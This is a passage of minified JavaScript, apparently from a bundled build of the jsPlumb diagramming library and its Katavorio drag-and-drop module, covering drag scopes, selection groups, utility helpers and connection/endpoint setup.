t)n[e]=t[e];for(e=0;e<c.length;e++)n.events[c[e]]=t[c[e]]||h;return n.katavorio=this,n}.bind(this)),p=function(t,e){for(var n=0;n<c.length;n++)e[c[n]]&&t.on(c[n],e[c[n]])}.bind(this),g={},b=o.css||{},v=o.scope||"katavorio-drag-scope";for(var m in u)g[m]=u[m];for(var m in b)g[m]=b[m];var w=o.inputFilterSelector||"input,textarea,select,button,option";this.getInputFilterSelector=function(){return w},this.setInputFilterSelector=function(t){return w=t,this},this.draggable=function(t,e){var n=[];return _(t,function(t){if(null!=(t=x(t)))if(null==t._katavorioDrag){var i=d(e);t._katavorioDrag=new j(t,i,g,v),a(t._katavorioDrag,this._dragsByScope),n.push(t._katavorioDrag),o.addClass(t,g.draggable)}else p(t._katavorioDrag,e)}.bind(this)),n},this.droppable=function(t,e){var n=[];return _(t,function(t){if(null!=(t=x(t))){var i=new y(t,d(e),g,v);t._katavorioDrop=t._katavorioDrop||[],t._katavorioDrop.push(i),a(i,this._dropsByScope),n.push(i),o.addClass(t,g.droppable)}}.bind(this)),n},this.select=function(t){return _(t,function(){var t=x(this);t&&t._katavorioDrag&&(r[t._katavorio]||(i.push(t._katavorioDrag),r[t._katavorio]=[t,i.length-1],o.addClass(t,g.selected)))}),this},this.deselect=function(t){return _(t,function(){var t=x(this);if(t&&t._katavorio&&r[t._katavorio]){for(var e=[],n=0;n<i.length;n++)i[n].el!==t&&e.push(i[n]);i=e,delete r[t._katavorio],o.removeClass(t,g.selected)}}),this},this.deselectAll=function(){for(var t in r){var e=r[t];o.removeClass(e[0],g.selected)}i.length=0,r={}},this.markSelection=function(t){f(i,function(t){t.mark()},t)},this.markPosses=function(t){t.posses&&_(t.posses,function(e){t.posseRoles[e]&&A[e]&&f(A[e].members,function(t){t.mark()},t)})},this.unmarkSelection=function(t,e){f(i,function(t){t.unmark(e)},t)},this.unmarkPosses=function(t,e){t.posses&&_(t.posses,function(n){t.posseRoles[n]&&A[n]&&f(A[n].members,function(t){t.unmark(e,!0)},t)})},this.getSelection=function(){return i.slice(0)},this.updateSelection=function(t,e,n){f(i,function(n){n.moveBy(t,e)},n)};var P=function(t,e){e.posses&&_(e.posses,function(n){e.posseRoles[n]&&A[n]&&f(A[n].members,function(e){t(e)},e)})};this.updatePosses=function(t,e,n){P(function(n){n.moveBy(t,e)},n)},this.notifyPosseDragStop=function(t,e){P(function(t){t.stop(e,!0)},t)},this.notifySelectionDragStop=function(t,e){f(i,function(t){t.stop(e,!0)},t)},this.notifySelectionDragStart=function(t,e){f(i,function(t){t.notifyStart(e)},t)},this.setZoom=function(t){s=t},this.getZoom=function(){return s};var C=function(t,e,n,o){_(t,function(t){l(t,n),t[o](e),a(t,n)})};_(["set","add","remove","toggle"],function(t){this[t+"Scope"]=function(e,n){C(e._katavorioDrag,n,this._dragsByScope,t+"Scope"),C(e._katavorioDrop,n,this._dropsByScope,t+"Scope")}.bind(this),this[t+"DragScope"]=function(e,n){C(e.constructor===j?e:e._katavorioDrag,n,this._dragsByScope,t+"Scope")}.bind(this),this[t+"DropScope"]=function(e,n){C(e.constructor===y?e:e._katavorioDrop,n,this._dropsByScope,t+"Scope")}.bind(this)}.bind(this)),this.snapToGrid=function(t,e){for(var n in this._dragsByScope)f(this._dragsByScope[n],function(n){n.snap(t,e)})},this.getDragsForScope=function(t){return this._dragsByScope[t]},this.getDropsForScope=function(t){return this._dropsByScope[t]};var S=function(t,e,n){if((t=x(t))[e]){var o=i.indexOf(t[e]);o>=0&&i.splice(o,1),l(t[e],n)&&_(t[e],function(t){t.destroy()}),delete t[e]}},I=function(t,e,n,o){(t=x(t))[e]&&t[e].off(n,o)};this.elementRemoved=function(t){this.destroyDraggable(t),this.destroyDroppable(t)},this.destroyDraggable=function(t,e,n){1===arguments.length?S(t,"_katavorioDrag",this._dragsByScope):I(t,"_katavorioDrag",e,n)},this.destroyDroppable=function(t,e,n){1===arguments.length?S(t,"_katavorioDrop",this._dropsByScope):I(t,"_katavorioDrop",e,n)},this.reset=function(){this._dragsByScope={},this._dropsByScope={},i=[],r={},A={}};var A={},T=function(e,o,i){var r,s=n(o)?o:o.id,a=!!n(o)||!1!==o.active,l=A[s]||(r={name:s,members:[]},A[s]=r,r);return _(e,function(e){if(e._katavorioDrag){if(i&&null!=e._katavorioDrag.posseRoles[l.name])return;t(l.members,e._katavorioDrag),t(e._katavorioDrag.posses,l.name),e._katavorioDrag.posseRoles[l.name]=a}}),l};this.addToPosse=function(t,e){for(var n=[],o=1;o<arguments.length;o++)n.push(T(t,arguments[o]));return 1===n.length?n[0]:n},this.setPosse=function(t,e){for(var n=[],o=1;o<arguments.length;o++)n.push(T(t,arguments[o],!0).name);return _(t,function(t){if(t._katavorioDrag){var e=function(t,e){for(var n=[],o=0;o<t.length;o++)-1===e.indexOf(t[o])&&n.push(t[o]);return n}(t._katavorioDrag.posses,n);Array.prototype.push.apply([],t._katavorioDrag.posses);for(var o=0;o<e.length;o++)this.removeFromPosse(t,e[o])}}.bind(this)),1===n.length?n[0]:n},this.removeFromPosse=function(t,n){if(arguments.length<2)throw new TypeError("No posse id provided for remove operation");for(var o=1;o<arguments.length;o++)n=arguments[o],_(t,function(t){if(t._katavorioDrag&&t._katavorioDrag.posses){var o=t._katavorioDrag;_(n,function(t){e(A[t].members,o),e(o.posses,t),delete o.posseRoles[t]})}})},this.removeFromAllPosses=function(t){_(t,function(t){if(t._katavorioDrag&&t._katavorioDrag.posses){var n=t._katavorioDrag;_(n.posses,function(t){e(A[t].members,n)}),n.posses.length=0,n.posseRoles={}}})},this.setPosseState=function(t,e,n){var o=A[e];o&&_(t,function(t){t._katavorioDrag&&t._katavorioDrag.posses&&(t._katavorioDrag.posseRoles[o.name]=n)})}},this.Katavorio.version="1.0.0","undefined"!=typeof exports&&(exports.Katavorio=this.Katavorio)}.call("undefined"!=typeof window?window:this),function(){"use strict";function t(t){return"[object Array]"===Object.prototype.toString.call(t)}function e(t){return"string"==typeof t}function n(t){return"boolean"==typeof t}function o(t){return null!=t&&"[object Object]"===Object.prototype.toString.call(t)}function i(t){return"[object Date]"===Object.prototype.toString.call(t)}function r(t){return"[object Function]"===Object.prototype.toString.call(t)}function s(a){if(e(a))return""+a;if(n(a))return!!a;if(i(a))return new Date(a.getTime());if(r(a))return a;if(t(a)){for(var l=[],d=0;d<a.length;d++)l.push(s(a[d]));return l}if(o(a)){var u={};for(var c in a)u[c]=s(a[c]);return u}return a}function a(i,r,a){var l,d,u={};for(a=a||[],d=0;d<a.length;d++)u[a[d]]=!0;var c=s(i);for(d in r)if(null==c[d])c[d]=r[d];else if(e(r[d])||n(r[d]))u[d]?(l=[],l.push.apply(l,t(c[d])?c[d]:[c[d]]),l.push.apply(l,n(r[d])?r[d]:[r[d]]),c[d]=l):c[d]=r[d];else if(t(r[d]))l=[],t(c[d])&&l.push.apply(l,c[d]),l.push.apply(l,r[d]),c[d]=l;else if(o(r[d])){o(c[d])||(c[d]={});for(var h in r[d])c[d][h]=r[d][h]}return c}function l(t,e){if(t)for(var n=0;n<t.length;n++)if(e(t[n]))return n;return-1}function d(t,e){var n=t.indexOf(e);return n>-1&&t.splice(n,1),-1!==n}function u(t,e,n,o){var i=t[e];return null==i&&(i=[],t[e]=i),i[o?"unshift":"push"](n),i}function c(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(t){var e=16*Math.random()|0;return("x"===t?e:3&e|8).toString(16)})}function h(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];if(f&&"undefined"!=typeof console)try{var n=arguments[arguments.length-1];console.log(n)}catch(t){}}var p=this.jsPlumbUtil={},f=!0,g=function(){return function(){var t=this;this._listeners={},this.eventsSuspended=!1,this.tick=!1,this.eventsToDieOn={ready:!0},this.queue=[],this.bind=function(e,n,o){var i=function(e){u(t._listeners,e,n,o),n.__jsPlumb=n.__jsPlumb||{},n.__jsPlumb[c()]=e};if("string"==typeof e)i(e);else if(null!=e.length)for(var r=0;r<e.length;r++)i(e[r]);return t},this.fire=function(t,e,n){if(this.tick)this.queue.unshift(arguments);else{if(this.tick=!0,!this.eventsSuspended&&this._listeners[t]){var o=this._listeners[t].length,i=0,r=!1,s=null;if(!this.shouldFireEvent||this.shouldFireEvent(t,e,n))for(;!r&&i<o&&!1!==s;){if(this.eventsToDieOn[t])this._listeners[t][i].apply(this,[e,n]);else try{s=this._listeners[t][i].apply(this,[e,n])}catch(e){h("jsPlumb: fire failed for event "+t+" : "+e)}i++,null!=this._listeners&&null!=this._listeners[t]||(r=!0)}}this.tick=!1,this._drain()}return this},this._drain=function(){var e=t.queue.pop();e&&t.fire.apply(t,e)},this.unbind=function(t,e){if(0===arguments.length)this._listeners={};else if(1===arguments.length){if("string"==typeof t)delete this._listeners[t];else if(t.__jsPlumb){var n=void 0;for(var o in t.__jsPlumb)n=t.__jsPlumb[o],d(this._listeners[n]||[],t)}}else 2===arguments.length&&d(this._listeners[t]||[],e);return this},this.getListener=function(e){return t._listeners[e]},this.setSuspendEvents=function(e){t.eventsSuspended=e},this.isSuspendEvents=function(){return t.eventsSuspended},this.silently=function(e){t.setSuspendEvents(!0);try{e()}catch(t){h("Cannot execute silent function "+t)}t.setSuspendEvents(!1)},this.cleanupListeners=function(){for(var e in t._listeners)t._listeners[e]=null}}}();p.isArray=t,p.isNumber=function(t){return"[object Number]"===Object.prototype.toString.call(t)},p.isString=e,p.isBoolean=n,p.isNull=function(t){return null==t},p.isObject=o,p.isDate=i,p.isFunction=r,p.isNamedFunction=function(t){return r(t)&&null!=t.name&&t.name.length>0},p.isEmpty=function(t){for(var e in t)if(t.hasOwnProperty(e))return!1;return!0},p.clone=s,p.merge=a,p.replace=function(t,e,n){if(null!=t){var o=t;return e.replace(/([^\.])+/g,function(t,e,i,r){var s=t.match(/([^\[0-9]+){1}(\[)([0-9+])/),a=function(){return o[s[1]]||(o[s[1]]=[],o[s[1]])};if(i+t.length>=r.length)s?a()[s[3]]=n:o[t]=n;else if(s){var l=a();o=l[s[3]]||(l[s[3]]={},l[s[3]])}else o=o[t]||(o[t]={},o[t]);return""}),t}},p.functionChain=function(t,e,n){for(var o=0;o<n.length;o++){var i=n[o][0][n[o][1]].apply(n[o][0],n[o][2]);if(i===e)return i}return t},p.populate=function(n,i,s,a){var l=function(n){if(null!=n){if(e(n))return function(t){var e=t.match(/(\${.*?})/g);if(null!=e)for(var n=0;n<e.length;n++){var o=i[e[n].substring(2,e[n].length-1)]||"";null!=o&&(t=t.replace(e[n],o))}return t}(n);if(!r(n)||a||null!=s&&0!==(n.name||"").indexOf(s)){if(t(n)){for(var d=[],u=0;u<n.length;u++)d.push(l(n[u]));return d}if(o(n)){var c={};for(var h in n)c[h]=l(n[h]);return c}return n}return n(i)}};return l(n)},p.findWithFunction=l,p.removeWithFunction=function(t,e){var n=l(t,e);return n>-1&&t.splice(n,1),-1!==n},p.remove=d,p.addWithFunction=function(t,e,n){-1===l(t,n)&&t.push(e)},p.addToList=u,p.suggest=function(t,e,n){return-1===t.indexOf(e)&&(n?t.unshift(e):t.push(e),!0)},p.extend=function(e,n,o){var i;n=t(n)?n:[n];var r=function(t){for(var n=t.__proto__;null!=n;)if(null!=n.prototype){for(var o in n.prototype)n.prototype.hasOwnProperty(o)&&!e.prototype.hasOwnProperty(o)&&(e.prototype[o]=n.prototype[o]);n=n.prototype.__proto__}else n=null};for(i=0;i<n.length;i++){for(var s in n[i].prototype)n[i].prototype.hasOwnProperty(s)&&!e.prototype.hasOwnProperty(s)&&(e.prototype[s]=n[i].prototype[s]);r(n[i])}var a=function(t,e){return function(){for(i=0;i<n.length;i++)n[i].prototype[t]&&n[i].prototype[t].apply(this,arguments);return e.apply(this,arguments)}},l=function(t){for(var n in t)e.prototype[n]=a(n,t[n])};if(arguments.length>2)for(i=2;i<arguments.length;i++)l(arguments[i]);return e},p.uuid=c,p.fastTrim=function(t){if(null==t)return null;for(var e=t.replace(/^\s\s*/,""),n=/\s/,o=e.length;n.test(e.charAt(--o)););return e.slice(0,o+1)},p.each=function(t,e){t=null==t.length||"string"==typeof t?[t]:t;for(var n=0;n<t.length;n++)e(t[n])},p.map=function(t,e){for(var n=[],o=0;o<t.length;o++)n.push(e(t[o]));return n},p.mergeWithParents=function(t,e,n){n=n||"parent";var o=function(t){return t?e[t]:null},i=function(t){return t?o(t[n]):null},r=function(t,e){if(null==t)return e;var n=a(t,e);return r(i(t),n)},s=function(t){if(null==t)return{};if("string"==typeof t)return o(t);if(t.length){for(var e=!1,n=0,i=void 0;!e&&n<t.length;)i=s(t[n]),i?e=!0:n++;return i}},l=s(t);return l?r(i(l),l):{}},p.logEnabled=f,p.log=h,p.wrap=function(t,e,n){return function(){var o=null;try{null!=e&&(o=e.apply(this,arguments))}catch(t){h("jsPlumb function failed : "+t)}if(null!=t&&(null==n||o!==n))try{o=t.apply(this,arguments)}catch(t){h("wrapped function failed : "+t)}return o}},p.EventGenerator=g}.call("undefined"!=typeof window?window:this),function(){"use strict";this.jsPlumbUtil.matchesSelector=function(t,e,n){for(var o=(n=n||t.parentNode).querySelectorAll(e),i=0;i<o.length;i++)if(o[i]===t)return!0;return!1},this.jsPlumbUtil.consume=function(t,e){t.stopPropagation?t.stopPropagation():t.returnValue=!1,!e&&t.preventDefault&&t.preventDefault()},this.jsPlumbUtil.sizeElement=function(t,e,n,o,i){t&&(t.style.height=i+"px",t.height=i,t.style.width=o+"px",t.width=o,t.style.left=e+"px",t.style.top=n+"px")}}.call("undefined"!=typeof window?window:this),function(){"use strict";var t=this,e=t.jsPlumbUtil,n=function(){return""+(new Date).getTime()},o=function(t){if(t._jsPlumb.paintStyle&&t._jsPlumb.hoverPaintStyle){var e={};p.extend(e,t._jsPlumb.paintStyle),p.extend(e,t._jsPlumb.hoverPaintStyle),delete t._jsPlumb.hoverPaintStyle,e.gradient&&t._jsPlumb.paintStyle.fill&&delete e.gradient,t._jsPlumb.hoverPaintStyle=e}},i=["tap","dbltap","click","dblclick","mouseover","mouseout","mousemove","mousedown","mouseup","contextmenu"],r=function(t){return null==t?null:t.split(" ")},s=function(t,e,n){for(var o in e)t[o]=n},a=function(t,n){n=e.isArray(n)||null!=n.length&&!e.isString(n)?n:[n];for(var o=0;o<n.length;o++)try{t.apply(n[o],[n[o]])}catch(t){e.log(".each iteration failed : "+t)}},l=function(t,n,o){if(t.getDefaultType){var i=t.getTypeDescriptor(),r={},a=t.getDefaultType(),l=e.merge({},a);s(r,a,"__default");for(var d=0,u=t._jsPlumb.types.length;d<u;d++){var c=t._jsPlumb.types[d];if("__default"!==c){var h=t._jsPlumb.instance.getType(c,i);null!=h&&(l=e.merge(l,h,["cssClass"]),s(r,h,c))}}n&&(l=e.populate(l,n,"_")),t.applyType(l,o,r),o||t.repaint()}},d=t.jsPlumbUIComponent=function(t){e.EventGenerator.apply(this,arguments);var n=arguments,o=this.idPrefix+(new Date).getTime();this._jsPlumb={instance:t._jsPlumb,parameters:t.parameters||{},paintStyle:null,hoverPaintStyle:null,paintStyleInUse:null,hover:!1,beforeDetach:t.beforeDetach,beforeDrop:t.beforeDrop,overlayPlacements:[],hoverClass:t.hoverClass||t._jsPlumb.Defaults.HoverClass,types:[],typeCache:{}},this.cacheTypeItem=function(t,e,n){this._jsPlumb.typeCache[n]=this._jsPlumb.typeCache[n]||{},this._jsPlumb.typeCache[n][t]=e},this.getCachedTypeItem=function(t,e){return this._jsPlumb.typeCache[e]?this._jsPlumb.typeCache[e][t]:null},this.getId=function(){return o};var i=t.overlays||[],r={};if(this.defaultOverlayKeys){for(var s=0;s<this.defaultOverlayKeys.length;s++)Array.prototype.push.apply(i,this._jsPlumb.instance.Defaults[this.defaultOverlayKeys[s]]||[]);for(s=0;s<i.length;s++){var a=p.convertToFullOverlaySpec(i[s]);r[a[1].id]=a}}var l={overlays:r,parameters:t.parameters||{},scope:t.scope||this._jsPlumb.instance.getDefaultScope()};if(this.getDefaultType=function(){return l},this.appendToDefaultType=function(t){for(var e in t)l[e]=t[e]},t.events)for(var d in t.events)this.bind(d,t.events[d]);this.clone=function(){var t=Object.create(this.constructor.prototype);return this.constructor.apply(t,n),t}.bind(this),this.isDetachAllowed=function(t){var n=!0;if(this._jsPlumb.beforeDetach)try{n=this._jsPlumb.beforeDetach(t)}catch(t){e.log("jsPlumb: beforeDetach callback failed",t)}return n},this.isDropAllowed=function(t,n,o,i,r,s,a){var l=this._jsPlumb.instance.checkCondition("beforeDrop",{sourceId:t,targetId:n,scope:o,connection:i,dropEndpoint:r,source:s,target:a});if(this._jsPlumb.beforeDrop)try{l=this._jsPlumb.beforeDrop({sourceId:t,targetId:n,scope:o,connection:i,dropEndpoint:r,source:s,target:a})}catch(t){e.log("jsPlumb: beforeDrop callback failed",t)}return l};var u=[];this.setListenerComponent=function(t){for(var e=0;e<u.length;e++)u[e][3]=t}},u=function(t,e){var n=t._jsPlumb.types[e],o=t._jsPlumb.instance.getType(n,t.getTypeDescriptor());null!=o&&o.cssClass&&t.canvas&&t._jsPlumb.instance.removeClass(t.canvas,o.cssClass)};e.extend(t.jsPlumbUIComponent,e.EventGenerator,{getParameter:function(t){return this._jsPlumb.parameters[t]},setParameter:function(t,e){this._jsPlumb.parameters[t]=e},getParameters:function(){return this._jsPlumb.parameters},setParameters:function(t){this._jsPlumb.parameters=t},getClass:function(){return p.getClass(this.canvas)},hasClass:function(t){return p.hasClass(this.canvas,t)},addClass:function(t){p.addClass(this.canvas,t)},removeClass:function(t){p.removeClass(this.canvas,t)},updateClasses:function(t,e){p.updateClasses(this.canvas,t,e)},setType:function(t,e,n){this.clearTypes(),this._jsPlumb.types=r(t)||[],l(this,e,n)},getType:function(){return this._jsPlumb.types},reapplyTypes:function(t,e){l(this,t,e)},hasType:function(t){return-1!==this._jsPlumb.types.indexOf(t)},addType:function(t,e,n){var o=r(t),i=!1;if(null!=o){for(var s=0,a=o.length;s<a;s++)this.hasType(o[s])||(this._jsPlumb.types.push(o[s]),i=!0);i&&l(this,e,n)}},removeType:function(t,e,n){var o=r(t),i=!1,s=function(t){var e=this._jsPlumb.types.indexOf(t);return-1!==e&&(u(this,e),this._jsPlumb.types.splice(e,1),!0)}.bind(this);if(null!=o){for(var a=0,d=o.length;a<d;a++)i=s(o[a])||i;i&&l(this,e,n)}},clearTypes:function(t,e){for(var n=this._jsPlumb.types.length,o=0;o<n;o++)u(this,0),this._jsPlumb.types.splice(0,1);l(this,t,e)},toggleType:function(t,e,n){var o=r(t);if(null!=o){for(var i=0,s=o.length;i<s;i++){var a=this._jsPlumb.types.indexOf(o[i]);-1!==a?(u(this,a),this._jsPlumb.types.splice(a,1)):this._jsPlumb.types.push(o[i])}l(this,e,n)}},applyType:function(t,e){if(this.setPaintStyle(t.paintStyle,e),this.setHoverPaintStyle(t.hoverPaintStyle,e),t.parameters)for(var n in t.parameters)this.setParameter(n,t.parameters[n]);this._jsPlumb.paintStyleInUse=this.getPaintStyle()},setPaintStyle:function(t,e){this._jsPlumb.paintStyle=t,this._jsPlumb.paintStyleInUse=this._jsPlumb.paintStyle,o(this),e||this.repaint()},getPaintStyle:function(){return this._jsPlumb.paintStyle},setHoverPaintStyle:function(t,e){this._jsPlumb.hoverPaintStyle=t,o(this),e||this.repaint()},getHoverPaintStyle:function(){return this._jsPlumb.hoverPaintStyle},destroy:function(t){(t||null==this.typeId)&&(this.cleanupListeners(),this.clone=null,this._jsPlumb=null)},isHover:function(){return this._jsPlumb.hover},setHover:function(t,e,o){if(this._jsPlumb&&!this._jsPlumb.instance.currentlyDragging&&!this._jsPlumb.instance.isHoverSuspended()){this._jsPlumb.hover=t;var i=t?"addClass":"removeClass";null!=this.canvas&&(null!=this._jsPlumb.instance.hoverClass&&this._jsPlumb.instance[i](this.canvas,this._jsPlumb.instance.hoverClass),null!=this._jsPlumb.hoverClass&&this._jsPlumb.instance[i](this.canvas,this._jsPlumb.hoverClass)),null!=this._jsPlumb.hoverPaintStyle&&(this._jsPlumb.paintStyleInUse=t?this._jsPlumb.hoverPaintStyle:this._jsPlumb.paintStyle,this._jsPlumb.instance.isSuspendDrawing()||(o=o||n(),this.repaint({timestamp:o,recalc:!1}))),this.getAttachedElements&&!e&&function(t,e,n,o){var i=t.getAttachedElements();if(i)for(var r=0,s=i.length;r<s;r++)o&&o===i[r]||i[r].setHover(e,!0,n)}(this,t,n(),this)}}});var c=0,h=t.jsPlumbInstance=function(o){this.version="2.7.16",this.Defaults={Anchor:"Bottom",Anchors:[null,null],ConnectionsDetachable:!0,ConnectionOverlays:[],Connector:"Bezier",Container:null,DoNotThrowErrors:!1,DragOptions:{},DropOptions:{},Endpoint:"Dot",EndpointOverlays:[],Endpoints:[null,null],EndpointStyle:{fill:"#456"},EndpointStyles:[null,null],EndpointHoverStyle:null,EndpointHoverStyles:[null,null],HoverPaintStyle:null,LabelStyle:{color:"black"},LogEnabled:!1,Overlays:[],MaxConnections:1,PaintStyle:{"stroke-width":4,stroke:"#456"},ReattachConnections:!1,RenderMode:"svg",Scope:"jsPlumb_DefaultScope"},o&&p.extend(this.Defaults,o),this.logEnabled=this.Defaults.LogEnabled,this._connectionTypes={},this._endpointTypes={},e.EventGenerator.apply(this);var r,s=this,l=(r=c+1,c++,r),u=s.bind,h={},f=1,g=function(t){if(null==t)return null;if(3===t.nodeType||8===t.nodeType)return{el:t,text:!0};var n=s.getElement(t);return{el:n,id:e.isString(t)&&null==n?t:H(n)}};this.getInstanceIndex=function(){return l},this.setZoom=function(t,e){return f=t,s.fire("zoom",f),e&&s.repaintEverything(),!0},this.getZoom=function(){return f};for(var _ in this.Defaults)h[_]=this.Defaults[_];var b,v=[];this.unbindContainer=function(){if(null!=b&&v.length>0)for(var t=0;t<v.length;t++)s.off(b,v[t][0],v[t][1])},this.setContainer=function(t){this.unbindContainer(),t=this.getElement(t),this.select().each(function(e){e.moveParent(t)}),this.selectEndpoints().each(function(e){e.moveParent(t)});var e=b;b=t,v.length=0;for(var n={endpointclick:"endpointClick",endpointdblclick:"endpointDblClick"},o=function(t,e,o){var i=e.srcElement||e.target,r=(i&&i.parentNode?i.parentNode._jsPlumb:null)||(i?i._jsPlumb:null)||(i&&i.parentNode&&i.parentNode.parentNode?i.parentNode.parentNode._jsPlumb:null);if(r){r.fire(t,r,e);var a=o&&n[o+t]||t;s.fire(a,r.component||r,e)}},r=function(t,e,n){v.push([t,n]),s.on(b,t,e,n)},a=function(t){r(t,".jtk-connector",function(e){o(t,e)}),r(t,".jtk-endpoint",function(e){o(t,e,"endpoint")}),r(t,".jtk-overlay",function(e){o(t,e)})},l=0;l<i.length;l++)a(i[l]);for(var d in E){var u=E[d].el;u.parentNode===e&&(e.removeChild(u),b.appendChild(u))}},this.getContainer=function(){return b},this.bind=function(t,e){"ready"===t&&w?e():u.apply(s,[t,e])},s.importDefaults=function(t){for(var e in t)s.Defaults[e]=t[e];return t.Container&&s.setContainer(t.Container),s},s.restoreDefaults=function(){return s.Defaults=p.extend({},h),s};var m=null,w=!1,j=[],y={},P={},E={},x={},C={},S={},I=!1,A=[],T=!1,k=null,D=this.Defaults.Scope,N=1,M=function(){return""+N++},O=function(t,e){b?b.appendChild(t):e?this.getElement(e).appendChild(t):this.appendToRoot(t)}.bind(this),F=function(t,e,o,i){if(!T){var r,a=H(t),l=s.getDragManager();l&&(r=l.getElementsForDraggable(a)),null==o&&(o=n());var d=st({elId:a,offset:e,recalc:!1,timestamp:o});if(r&&d&&d.o)for(var u in r)st({elId:r[u].id,offset:{left:d.o.left+r[u].offset.left,top:d.o.top+r[u].offset.top},recalc:!1,timestamp:o});if(s.anchorManager.redraw(a,e,o,null,i),r)for(var c in r)s.anchorManager.redraw(r[c].id,e,o,r[c].offset,i,!0)}},L=function(t){return P[t]},R=function(t,n){var o=p.extend({},t);if(n&&p.extend(o,n),o.source&&(o.source.endpoint?o.sourceEndpoint=o.source:o.source=s.getElement(o.source)),o.target&&(o.target.endpoint?o.targetEndpoint=o.target:o.target=s.getElement(o.target)),t.uuids&&(o.sourceEndpoint=L(t.uuids[0]),o.targetEndpoint=L(t.uuids[1])),o.sourceEndpoint&&o.sourceEndpoint.isFull())e.log(s,"could not add connection; source endpoint is full");else{if(!o.targetEndpoint||!o.targetEndpoint.isFull()){if(!o.type&&o.sourceEndpoint&&(o.type=o.sourceEndpoint.connectionType),o.sourceEndpoint&&o.sourceEndpoint.connectorOverlays){o.overlays=o.overlays||[];for(var i=0,r=o.sourceEndpoint.connectorOverlays.length;i<r;i++)o.overlays.push(o.sourceEndpoint.connectorOverlays[i])}o.sourceEndpoint&&o.sourceEndpoint.scope&&(o.scope=o.sourceEndpoint.scope),!o["pointer-events"]&&o.sourceEndpoint&&o.sourceEndpoint.connectorPointerEvents&&(o["pointer-events"]=o.sourceEndpoint.connectorPointerEvents);var a=function(t,e,n){return s.addEndpoint(t,function(t,e){var n=p.extend({},t);for(var o in e)e[o]&&(n[o]=e[o]);return n}(e,{anchor:o.anchors?o.anchors[n]:o.anchor,endpoint:o.endpoints?o.endpoints[n]:o.endpoint,paintStyle:o.endpointStyles?o.endpointStyles[n]:o.endpointStyle,hoverPaintStyle:o.endpointHoverStyles?o.endpointHoverStyles[n]:o.endpointHoverStyle}))},l=function(t,e,n,i){if(o[t]&&!o[t].endpoint&&!o[t+"Endpoint"]&&!o.newConnection){var r=n[H(o[t])];if(r=r?r[i]:null){if(!r.enabled)return!1;var s=null!=r.endpoint&&r.endpoint._jsPlumb?r.endpoint:a(o[t],r.def,e);if(s.isFull())return!1;o[t+"Endpoint"]=s,!o.scope&&r.def.scope&&(o.scope=r.def.scope),r.uniqueEndpoint?r.endpoint?s.finalEndpoint=r.endpoint:(r.endpoint=s,s.setDeleteOnEmpty(!1)):s.setDeleteOnEmpty(!0),0===e&&r.def.connectorOverlays&&(o.overlays=o.overlays||[],Array.prototype.push.apply(o.overlays,r.def.connectorOverlays))}}};return!1!==l("source",0,this.sourceEndpointDefinitions,o.type||"default")&&!1!==l("target",1,this.targetEndpointDefinitions,o.type||"default")?(o.sourceEndpoint&&o.targetEndpoint&&(function(t,e){for(var n=t.scope.split(/\s/),o=e.scope.split(/\s/),i=0;i<n.length;i++)for(var r=0;r<o.length;r++)if(o[r]===n[i])return!0;return!1}(o.sourceEndpoint,o.targetEndpoint)||(o=null)),o):void 0}e.log(s,"could not add connection; target endpoint is full")}}.bind(s),G=function(t){var e=s.Defaults.ConnectionType||s.getDefaultConnectionType();t._jsPlumb=s,t.newConnection=G,t.newEndpoint=z,t.endpointsByUUID=P,t.endpointsByElement=y,t.finaliseConnection=U,t.id="con_"+M();var n=new e(t);return n.isDetachable()&&(n.endpoints[0].initDraggable("_jsPlumbSource"),n.endpoints[1].initDraggable("_jsPlumbTarget")),n},U=s.finaliseConnection=function(t,e,n,o){if(e=e||{},t.suspendedEndpoint||j.push(t),t.pending=null,t.endpoints[0].isTemporarySource=!1,!1!==o&&s.anchorManager.newConnection(t),F(t.source),!e.doNotFireConnectionEvent&&!1!==e.fireEvent){var i={connection:t,source:t.source,target:t.target,sourceId:t.sourceId,targetId:t.targetId,sourceEndpoint:t.endpoints[0],targetEndpoint:t.endpoints[1]};s.fire("connection",i,n)}},z=function(t,e){var n=s.Defaults.EndpointType||p.Endpoint,o=p.extend({},t);o._jsPlumb=s,o.newConnection=G,o.newEndpoint=z,o.endpointsByUUID=P,o.endpointsByElement=y,o.fireDetachEvent=Y,o.elementId=e||H(o.source);var i=new n(o);return i.id="ep_"+M(),rt(o.elementId,o.source),p.headless||s.getDragManager().endpointAdded(o.source,e),i},V=function(t,e,n){var o=y[t];if(o&&o.length)for(var i=0,r=o.length;i<r;i++){for(var s=0,a=o[i].connections.length;s<a;s++){if(e(o[i].connections[s]))return}n&&n(o[i])}},B=function(t,e,n){e="block"===e;var o=null;n&&(o=function(t){t.setVisible(e,!0,!0)});var i=g(t);V(i.id,function(t){if(e&&n){var o=t.sourceId===i.id?1:0;t.endpoints[o].isVisible()&&t.setVisible(!0)}else t.setVisible(e)},o)},H=function(t,n,o){if(e.isString(t))return t;if(null==t)return null;var i=s.getAttribute(t,"id");return i&&"undefined"!==i||(2===arguments.length&&void 0!==arguments[1]?i=n:(1===arguments.length||3===arguments.length&&!arguments[2])&&(i="jsPlumb_"+l+"_"+M()),o||s.setAttribute(t,"id",i)),i};this.setConnectionBeingDragged=function(t){I=t},this.isConnectionBeingDragged=function(){return I},this.getManagedElements=function(){return E},this.connectorClass="jtk-connector",this.connectorOutlineClass="jtk-connector-outline",this.connectedClass="jtk-connected",this.hoverClass="jtk-hover",this.endpointClass="jtk-endpoint",this.endpointConnectedClass="jtk-endpoint-connected",this.endpointFullClass="jtk-endpoint-full",this.endpointDropAllowedClass="jtk-endpoint-drop-allowed",this.endpointDropForbiddenClass="jtk-endpoint-drop-forbidden",this.overlayClass="jtk-overlay",this.draggingClass="jtk-dragging",this.elementDraggingClass="jtk-element-dragging",this.sourceElementDraggingClass="jtk-source-element-dragging",this.targetElementDraggingClass="jtk-target-element-dragging",this.endpointAnchorClassPrefix="jtk-endpoint-anchor",this.hoverSourceClass="jtk-source-hover",this.hoverTargetClass="jtk-target-hover",this.dragSelectClass="jtk-drag-select",this.Anchors={},this.Connectors={svg:{}},this.Endpoints={svg:{}},this.Overlays={svg:{}},this.ConnectorRenderers={},this.SVG="svg",this.addEndpoint=function(t,n,o){o=o||{};var i=p.extend({},o);p.extend(i,n),i.endpoint=i.endpoint||s.Defaults.Endpoint,i.paintStyle=i.paintStyle||s.Defaults.EndpointStyle;for(var 